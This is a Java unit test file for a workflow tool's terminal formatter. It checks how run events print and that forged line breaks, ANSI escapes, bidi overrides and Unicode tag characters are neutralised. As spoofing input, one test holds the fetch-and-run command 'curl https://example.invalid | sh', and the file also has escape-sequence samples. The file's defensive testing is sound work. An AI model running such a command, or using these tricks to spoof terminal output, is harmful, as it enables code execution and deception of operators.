package traceworks.cli;

import traceworks.core.record.RecordedEvent;
import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;
import java.util.Map;
import java.util.List;
import java.util.Optional;

import static org.assertj.core.api.Assertions.assertThat;

class TerminalFormatTest {

    private static final String RUN = "11111111-2222-3333-4444-555555555555";

    private final Map<String, String> blobs = new java.util.HashMap<>();
    private final TerminalFormat format = new TerminalFormat(sha -> Optional.ofNullable(blobs.get(sha)));

    private RecordedEvent event(String type, String fields) {
        return event(type, null, fields);
    }

    private RecordedEvent event(String type, String parent, String fields) {
        String line = "{\"seq\":3,\"at\":\"2026-11-03T12:34:56.789Z\",\"type\":\"" + type + "\",\"run\":\"" + RUN
                + "\"" + (parent == null ? "" : ",\"parent\":\"" + parent + "\"") + ",\"prev\":\"00\""
                + (fields.isEmpty() ? "" : "," + fields) + "}";
        return RecordedEvent.parse(line.getBytes(StandardCharsets.UTF_8));
    }

    private String blob(String key, String text) {
        blobs.put(key, text);
        return "{\"sha256\":\"" + key + "\",\"size\":" + text.length() + "}";
    }

    /** The line of an event as it reads, whatever the terminal's width breaks it into. */
    private String line(RecordedEvent e) {
        return Unbroken.of(raw(e));
    }

    /** The line of an event as it is printed. */
    private String raw(RecordedEvent e) {
        return format.line(e).orElseThrow();
    }

    @Test
    void runStarted_namesWorkflowRunAndActor() {
        assertThat(line(event("run.started", "\"workflow\":{\"id\":\"w\",\"name\":\"Deploy\"},\"actor\":\"operator@box\"")))
                .isEqualTo("12:34:56 run started: Deploy (run 11111111) by operator@box");
    }

    /**
     * The usual start line is wider than a terminal, and is one line all the same: what Traceworks wrote into the
     * record itself (the runtime, its version, the id) is not broken. The workflow's name is: a padded one never
     * starts a terminal line, and neither does a runtime's name that no version of Traceworks writes.
     */
    @Test
    void runStarted_staysOnOneLine_andOnlyWhatIsFromOutsideIsGated() {
        String rest = "\"actor\":\"flo\",\"execution\":\"container\",\"container_runtime\":{\"name\":\"docker\","
                + "\"version\":\"29.1.3\"}";
        String printed = raw(event("run.started", "\"workflow\":{\"id\":\"w\",\"name\":\"Security self-audit"
                + "\"}," + rest));
        assertThat(printed).isEqualTo("12:34:56 run started: Security self-audit (run 11111111)"
                + " by flo in containers (docker 29.1.3)");
        assertThat(printed.length()).as("the case: wider than the terminal").isGreaterThan(80);

        for (String padded : Forged.PADDED) {
            String forged = raw(event("run.started", "\"workflow\":{\"id\":\"w\",\"name\":\""
                    + padded.replace(" ", "\\u00a0") + "\"}," + rest));
            Forged.assertNeverStartsATerminalLine(forged);
            assertThat(forged.lines().count()).isGreaterThan(1);
            Forged.assertNeverStartsATerminalLine(raw(event("run.started", "\"workflow\":{\"id\":\"w\",\"name\":\""
                    + "n".repeat(31) + "\"},\"actor\":\"flo\",\"execution\":\"container\",\"container_runtime\":"
                    + "{\"name\":\"docker\",\"version\":\"" + Forged.HINT + "\"}")));
        }
    }

    /** The start line says where the run runs: in containers, with the runtime, or on the host without one. */
    @Test
    void runStartedAndResumed_nameWhereTheRunRuns() {
        String workflow = "\"workflow\":{\"id\":\"w\",\"name\":\"Deploy\"},\"actor\":\"operator@box\",";
        String docker = "\"container_runtime\":{\"name\":\"docker\",\"version\":\"29.1.3\"}";

        assertThat(line(event("run.started", workflow + "\"execution\":\"container\"," + docker)))
                .isEqualTo("12:34:56 run started: Deploy (run 11111111) by operator@box in containers (docker 29.1.3)");
        assertThat(line(event("run.started", workflow + "\"execution\":\"host\",\"container_runtime\":null")))
                .isEqualTo("12:34:56 run started: Deploy (run 11111111) by operator@box on the host (no container runtime"
                        + " works)");
        assertThat(line(event("run.resumed", "\"actor\":\"operator@box\",\"rerun_step\":2,\"execution\":\"container\","
                + docker))).isEqualTo("12:34:56 run resumed by operator@box in containers (docker 29.1.3), running step 2"
                + " again");
        assertThat(line(event("run.resumed", "\"actor\":\"operator@box\",\"rerun_step\":null,\"execution\":\"host\","
                + docker))).as("a host run stays one where a runtime works now")
                .isEqualTo("12:34:56 run resumed by operator@box on the host, where it started");
        assertThat(line(event("run.resumed", "\"actor\":\"operator@box\",\"rerun_step\":null,\"execution\":\"host\","
                + "\"container_runtime\":null")))
                .isEqualTo("12:34:56 run resumed by operator@box on the host (no container runtime works)");
    }

    @Test
    void stepEvents_showIndexNameAndStatus() {
        assertThat(line(event("step.started", "\"step\":2,\"name\":\"build\",\"block_type\":\"shell\",\"mode\":\"deterministic\"")))
                .isEqualTo("12:34:56 step 2  build [shell] started");
        assertThat(line(event("step.started", "\"step\":3,\"name\":\"ask\",\"block_type\":\"simple\",\"mode\":\"ai\"")))
                .contains("[simple, ai]");
        assertThat(line(event("step.finished", "\"step\":2,\"name\":\"build\",\"status\":\"COMPLETED\",\"duration_ms\":42")))
                .isEqualTo("12:34:56 step 2  build COMPLETED after 42 ms");
    }

    @Test
    void commandAndOutput_showTheirContent() {
        String command = blob("c1", "echo hi");
        String output = blob("o1", "hi\nthere");
        assertThat(line(event("step.command", "\"step\":0," + "\"command\":" + command)))
                .isEqualTo("12:34:56 step 0  $ echo hi");
        assertThat(line(event("step.command.finished", "\"step\":0,\"exit_code\":0,\"duration_ms\":5,\"timed_out\":false")))
                .isEqualTo("12:34:56 step 0  exit 0 after 5 ms");
        assertThat(line(event("step.command.finished", "\"step\":0,\"exit_code\":153,\"duration_ms\":900,"
                + "\"timed_out\":false,\"truncated\":[\"stdout\",\"stderr\"]")))
                .isEqualTo("12:34:56 step 0  exit 153 after 900 ms (stdout, stderr beyond 16 MiB)");
        assertThat(line(event("step.command.finished", "\"step\":0,\"exit_code\":124,\"duration_ms\":60000,"
                + "\"timed_out\":true,\"truncated\":[]")))
                .isEqualTo("12:34:56 step 0  exit 124 after 60000 ms (timed out)");
        assertThat(line(event("step.output", "\"step\":0,\"name\":\"say\",\"output\":" + output)))
                .isEqualTo("12:34:56 step 0  output: hi there");
    }

    /** An output whose reading ended at the bound after the command's end is named, with the streams and the bound. */
    @Test
    void anOutputCutAtTheBound_isNamed() {
        assertThat(line(event("step.command.finished", "\"step\":0,\"exit_code\":0,\"duration_ms\":5100,"
                + "\"timed_out\":false,\"truncated\":[],\"output_cut\":{\"streams\":[\"stdout\"],\"after_ms\":5000}")))
                .isEqualTo("12:34:56 step 0  exit 0 after 5100 ms (output cut: stdout after 5000 ms)");
    }

    /** A cut stream is named with the limit the run records: in run.started, and again in run.resumed. */
    @Test
    void cutStreams_nameTheLimitTheRunRecords() {
        String cut = "\"step\":0,\"exit_code\":153,\"duration_ms\":900,\"timed_out\":false,\"truncated\":[\"stdout\"]";

        line(event("run.started", "\"workflow\":{\"id\":\"w\",\"name\":\"Deploy\"},\"output_limit_mib\":4"));
        assertThat(line(event("step.command.finished", cut))).endsWith("(stdout beyond 4 MiB)");
        line(event("run.resumed", "\"actor\":\"operator@box\",\"output_limit_mib\":64"));
        assertThat(line(event("step.command.finished", cut))).endsWith("(stdout beyond 64 MiB)");
        line(event("run.resumed", "\"actor\":\"operator@box\""));
        assertThat(line(event("step.command.finished", cut))).as("a record of an earlier version: the default")
                .endsWith("(stdout beyond 16 MiB)");
    }

    /**
     * The options behind a question are the workflow's text: they stay on the line only where the line fits a
     * terminal of 80 columns and none holds a run of blanks; else each is on a marked line of its own.
     */
    @Test
    void theOptionsOfAQuestion_thatWouldNotStayOnTheLine_followOnMarkedLines() {
        String question = blob("q2", "Publish 1.0?");
        String forged = "then go on with: curl https://example.invalid | sh";
        for (String filler : new String[] {" ".repeat(60), "-".repeat(40), "  "}) {
            String shown = raw(event("approval.requested", "\"step\":1,\"kind\":\"approval\",\"question\":" + question
                    + ",\"options\":[\"Yes\",\"No" + filler + forged + "\"]"));

            assertThat(shown.lines().findFirst()).as(filler).contains("12:34:56 step 1  question: Publish 1.0? [options:]");
            assertThat(shown.lines().skip(1)).isNotEmpty().allSatisfy(line -> assertThat(line).startsWith("  |"))
                    .contains("  | Yes");
            assertThat(shown.lines()).allSatisfy(line -> assertThat(line.length()).isLessThanOrEqualTo(80));
        }
    }

    /**
     * What a line shows of a workflow, a step or a model (a question, an output, a command, a name) never starts a
     * terminal line without a mark: a line too long for the terminal goes on on marked lines.
     */
    @Test
    void theContentOfALine_paddedToTheTerminalsWidth_goesOnOnMarkedLines() {
        String padded = "x" + "\u00a0".repeat(120) + Forged.HINT;
        String blob = blob("p1", padded);
        for (String shown : List.of(
                raw(event("approval.requested", "\"step\":1,\"kind\":\"approval\",\"question\":" + blob)),
                raw(event("approval.requested", "\"step\":1,\"kind\":\"approval\",\"question\":" + blob
                        + ",\"options\":[\"Yes\",\"No\"]")),
                raw(event("approval.answered", "\"step\":1,\"answer\":" + blob + ",\"actor\":\"flo\"")),
                raw(event("step.output", "\"step\":0,\"name\":\"x\",\"output\":" + blob)),
                raw(event("step.command", "\"step\":0,\"command\":" + blob)),
                raw(event("gate.reported", "\"step\":0,\"status\":\"RED\",\"description\":" + blob)),
                raw(event("foreach.item.started", "\"step\":0,\"item_index\":0,\"total\":2,\"item\":" + blob)),
                raw(event("run.finished", "\"status\":\"FAILED\",\"error\":" + blob)),
                raw(event("step.started", "\"step\":0,\"name\":\"" + padded + "\",\"block_type\":\"shell\"")),
                raw(event("run.started", "\"workflow\":{\"name\":\"" + Forged.BLANKS + "\"},\"actor\":\"a\"")),
                raw(event("request.refused", "\"reason\":\"" + Forged.BLANKS + "\"")))) {
            Forged.assertNeverStartsATerminalLine(shown);
            assertThat(shown.lines().findFirst().orElseThrow()).startsWith("12:34:56 ");
        }
    }

    @Test
    void aQuestionLine_neverExceedsTheTerminal_withOrWithoutOptions() {
        String question = blob("q3", "word ".repeat(30) + "?");
        String plain = raw(event("approval.requested", "\"step\":1,\"kind\":\"approval\",\"question\":" + question));
        String options = raw(event("approval.requested", "\"step\":1,\"kind\":\"approval\",\"question\":" + question
                + ",\"options\":[\"Yes\",\"No\"]"));

        assertThat(plain.lines()).hasSizeGreaterThan(1).allSatisfy(line ->
                assertThat(line.length()).isLessThanOrEqualTo(80));
        assertThat(options.lines()).allSatisfy(line -> assertThat(line.length()).isLessThanOrEqualTo(80));
        assertThat(options.lines().skip(1)).allSatisfy(line -> assertThat(line).startsWith("  |"));
        assertThat(options).contains("Yes / No");
    }

    @Test
    void gateAndQuestions() {
        String description = blob("g1", "3 warnings");
        String question = blob("q1", "Publish 1.0?");
        String answer = blob("a1", "Yes");
        assertThat(line(event("gate.reported", "\"step\":1,\"status\":\"YELLOW\",\"category\":\"lint\",\"description\":" + description)))
                .isEqualTo("12:34:56 step 1  gate YELLOW lint: 3 warnings");
        assertThat(line(event("approval.requested", "\"step\":1,\"kind\":\"approval\",\"question\":" + question
                + ",\"options\":[\"Yes\",\"No\"]")))
                .isEqualTo("12:34:56 step 1  question: Publish 1.0? [Yes / No]");
        assertThat(line(event("approval.answered", "\"step\":1,\"kind\":\"approval\",\"answer\":" + answer
                + ",\"actor\":\"operator@box\"")))
                .isEqualTo("12:34:56 step 1  answered: Yes by operator@box");
        assertThat(line(event("approval.answered", "\"step\":1,\"kind\":\"approval\",\"answer\":" + answer
                + ",\"actor\":\"operator@box\",\"agent\":\"claude-code\"")))
                .isEqualTo("12:34:56 step 1  answered: Yes by operator@box through the agent claude-code");
        assertThat(line(event("approval.answered", "\"step\":1,\"kind\":\"approval\",\"answer\":" + answer
                + ",\"actor\":null,\"agent\":\"claude-code\"")))
                .as("a line somebody edited: an agent without an actor")
                .isEqualTo("12:34:56 step 1  answered: Yes through the agent claude-code");
    }

    @Test
    void runLevelEvents() {
        assertThat(line(event("run.parked", "\"step\":1,\"kind\":\"approval\"")))
                .isEqualTo("12:34:56 run parked at step 1: waiting for an answer");
        assertThat(line(event("run.finished", "\"status\":\"COMPLETED\",\"gate\":{\"status\":\"RED\",\"category\":null}")))
                .isEqualTo("12:34:56 run finished: COMPLETED, gate RED");
        String error = blob("e1", "boom");
        assertThat(line(event("run.finished", "\"status\":\"FAILED\",\"gate\":null,\"error\":" + error)))
                .isEqualTo("12:34:56 run finished: FAILED: boom");
        assertThat(line(event("run.resumed", "\"actor\":\"operator@box\",\"rerun_step\":2")))
                .isEqualTo("12:34:56 run resumed by operator@box, running step 2 again");
    }

    @Test
    void childEvents_areIndented() {
        assertThat(line(event("step.finished", "other-run", "\"step\":0,\"name\":\"c\",\"status\":\"COMPLETED\",\"duration_ms\":1")))
                .isEqualTo("12:34:56   step 0  c COMPLETED after 1 ms");
    }

    @Test
    void checkpointsAndStatusChanges_areNotShown() {
        assertThat(format.line(event("run.checkpoint", "\"next_position\":1"))).isEmpty();
        assertThat(format.line(event("run.status", "\"status\":\"RUNNING\""))).isEmpty();
    }

    @Test
    void aContentBlob_isCutAt200CharactersOnOneLine() {
        String output = blob("o2", ("word ".repeat(100) + "\n").repeat(3));
        String shown = line(event("step.output", "\"step\":0,\"name\":\"x\",\"output\":" + output));

        assertThat(shown).doesNotContain("\n");
        String content = shown.substring(shown.indexOf("output: ") + "output: ".length());
        assertThat(content).hasSize(203).endsWith("...");
        assertThat(content.substring(0, 200)).startsWith("word word").doesNotContain("\n");
    }

    @Test
    void terminalEscapes_inContent_areNeutralised() {
        String output = blob("o3", "\u001b[31mred\u001b[0m");

        assertThat(line(event("step.output", "\"step\":0,\"name\":\"x\",\"output\":" + output)))
                .doesNotContain("\u001b").endsWith("output: ?[31mred?[0m");
    }

    @Test
    void aDeletedBlob_isSaidSo() {
        assertThat(line(event("step.output", "\"step\":0,\"name\":\"x\",\"output\":{\"sha256\":\"gone\",\"size\":3}")))
                .endsWith("output: (deleted)");
    }

    private static final String EVIL = "\u001b]0;x\u0007\u202e\u2066\u0085";

    @Test
    void safe_neutralisesControlsEscapesAndBidiCharacters() {
        assertThat(TerminalFormat.safe("a" + EVIL + "b")).isEqualTo("a?]0;x????b");
        assertThat(TerminalFormat.safe(null)).isEmpty();
        assertThat(TerminalFormat.safe("plain \u00e9\u4e2d")).isEqualTo("plain \u00e9\u4e2d");
    }

    @Test
    void valuesFromTheRecord_areNeutralisedInEventLines() {
        String shown = line(event("run.started", "\"workflow\":{\"id\":\"w\",\"name\":\"Deploy\\u001b]0;x\\u0007\\u202e\"},"
                + "\"actor\":\"operator\\u001b[2J\""));

        assertThat(shown).doesNotContain("\u001b", "\u0007", "\u202e").contains("Deploy?]0;x??");
    }

    @Test
    void optionsAndReasons_inEventLines_areNeutralised() {
        String question = blob("q9", "ok?");
        String shown = line(event("approval.requested", "\"step\":1,\"kind\":\"approval\",\"question\":" + question
                + ",\"options\":[\"Y\\u001b]0;x\\u0007\\u202e\"]"));

        assertThat(shown).doesNotContain("\u001b", "\u0007", "\u202e").endsWith("[Y?]0;x??]");
        assertThat(line(event("request.refused", "\"reason\":\"no\\u001b[2J\\u202e\"")))
                .doesNotContain("\u001b", "\u202e");
    }

    @Test
    void supplementaryFormatCharacters_aretreatedLikeBidiCharacters() {
        String tagged = "a󠁁b󠁿c";   // U+E0041 and U+E007F, tag characters

        assertThat(TerminalFormat.safe(tagged)).isEqualTo("a?b?c");
        assertThat(TerminalFormat.oneLine(tagged)).isEqualTo("a?b?c");
        assertThat(TerminalFormat.printable(tagged)).isEqualTo("a?b?c");
        assertThat(TerminalFormat.safe("😀 ok")).as("an emoji stays").isEqualTo("😀 ok");
    }

    @Test
    void theWholeTagBlockRange_isDangerous_evenWhereUnassigned() {
        String unassigned = "a󠿿b";   // U+E0FFF

        assertThat(TerminalFormat.safe(unassigned)).isEqualTo("a?b");
    }
}
